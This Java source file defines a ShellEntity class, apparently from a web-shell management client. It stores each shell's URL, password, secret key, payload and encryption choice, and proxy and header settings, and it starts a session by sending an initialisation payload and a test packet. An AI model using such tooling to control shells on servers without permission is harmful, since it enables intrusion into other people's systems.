package core.shell;

import core.ApplicationContext;
import core.imp.Cryption;
import core.imp.Payload;
import core.ui.ShellManage;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import util.Log;
import util.functions;
import util.http.Http;

public class ShellEntity {
    private int connTimeout = 60000;
    private String cryption = new String();
    private Cryption cryptionModel;
    private String encoding = new String();
    private ShellManage frame;
    private Map<String, String> headers = new HashMap();
    private Http http;
    private String id = new String();
    private boolean isSendLRReqData;
    private String password = new String();
    private String payload = new String();
    private Payload payloadModel;
    private String proxyHost = new String();
    private int proxyPort = 8888;
    private String proxyType = new String();
    private int readTimeout = 60000;
    private String remark = new String();
    private String reqLeft = new String();
    private String reqRight = new String();
    private String secretKey = new String();
    private String url = new String();

    public boolean initShellOpertion() {
        boolean state = false;
        try {
            this.http = ApplicationContext.getHttp(this);
            this.payloadModel = ApplicationContext.getPayload(this.payload);
            this.cryptionModel = ApplicationContext.getCryption(this.payload, this.cryption);
            //初始化，会发送初始化payload
            this.cryptionModel.init(this);
            if (this.cryptionModel.check()) {
                this.payloadModel.init(this);
                //发送测试包
                if (this.payloadModel.test()) {
                    state = true;
                } else {
                    Log.error("payload Initialize Fail !");
                }
            } else {
                Log.error("cryption Initialize Fail !");
            }
            return state;
        } catch (Exception e) {
            Log.error(e);
            return false;
        }
    }

    public Http getHttp() {
        return this.http;
    }

    public Cryption getCryptionModel() {
        return this.cryptionModel;
    }

    public Payload getPayloadModel() {
        return this.payloadModel;
    }

    public String getId() {
        return this.id;
    }

    public void setId(String id2) {
        this.id = id2;
    }

    public String getPassword() {
        return this.password;
    }

    public String getSecretKey() {
        return this.secretKey;
    }

    public String getSecretKeyX() {
        return functions.md5(getSecretKey()).substring(0, 16);
    }

    public String getPayload() {
        return this.payload;
    }

    public String getEncoding() {
        return this.encoding;
    }

    public String getProxyType() {
        return this.proxyType;
    }

    public String getProxyHost() {
        return this.proxyHost;
    }

    public int getProxyPort() {
        return this.proxyPort;
    }

    public String getCryption() {
        return this.cryption;
    }

    public void setCryption(String cryption2) {
        this.cryption = cryption2;
    }

    public void setHeaders(Map<String, String> headers2) {
        this.headers = headers2;
    }

    public void setPassword(String password2) {
        this.password = password2;
    }

    public void setSecretKey(String secretKey2) {
        this.secretKey = secretKey2;
    }

    public void setPayload(String Payload) {
        this.payload = Payload;
    }

    public void setEncoding(String encoding2) {
        this.encoding = encoding2;
    }

    public void setProxyType(String proxyType2) {
        this.proxyType = proxyType2;
    }

    public void setProxyHost(String proxyHost2) {
        this.proxyHost = proxyHost2;
    }

    public void setProxyPort(int proxyPort2) {
        this.proxyPort = proxyPort2;
    }

    public int getConnTimeout() {
        return this.connTimeout;
    }

    public int getReadTimeout() {
        return this.readTimeout;
    }

    public void setConnTimeout(int connTimeout2) {
        this.connTimeout = connTimeout2;
    }

    public void setReadTimeout(int readTimeout2) {
        this.readTimeout = readTimeout2;
    }

    public Map<String, String> getHeaders() {
        return this.headers;
    }

    public String getHeaderS() {
        StringBuilder builder = new StringBuilder();
        for (String key : this.headers.keySet()) {
            builder.append(key);
            builder.append(": ");
            builder.append(this.headers.get(key));
            builder.append("\r\n");
        }
        return builder.toString();
    }

    public String getRemark() {
        return this.remark;
    }

    public void setRemark(String remark2) {
        this.remark = remark2;
    }

    public ShellManage getFrame() {
        return this.frame;
    }

    public void setFrame(ShellManage frame2) {
        this.frame = frame2;
    }

    public void setHeader(String reqString) {
        int index;
        if (reqString != null) {
            String[] reqLines = reqString.split("\n");
            this.headers = new Hashtable();
            for (int i = 0; i < reqLines.length; i++) {
                if (!reqLines[i].trim().isEmpty() && (index = reqLines[i].indexOf(":")) > 1) {
                    this.headers.put(reqLines[i].substring(0, index).trim(), reqLines[i].substring(index + 1, reqLines[i].length()).trim());
                }
            }
        }
    }

    public String getReqLeft() {
        return this.reqLeft;
    }

    public void setReqLeft(String reqLeft2) {
        this.reqLeft = reqLeft2;
    }

    public String getReqRight() {
        return this.reqRight;
    }

    public void setReqRight(String reqRight2) {
        this.reqRight = reqRight2;
    }

    public String getUrl() {
        return this.url;
    }

    public void setUrl(String url2) {
        this.url = url2;
    }

    public boolean isSendLRReqData() {
        return this.cryptionModel.isSendRLData();
    }
}
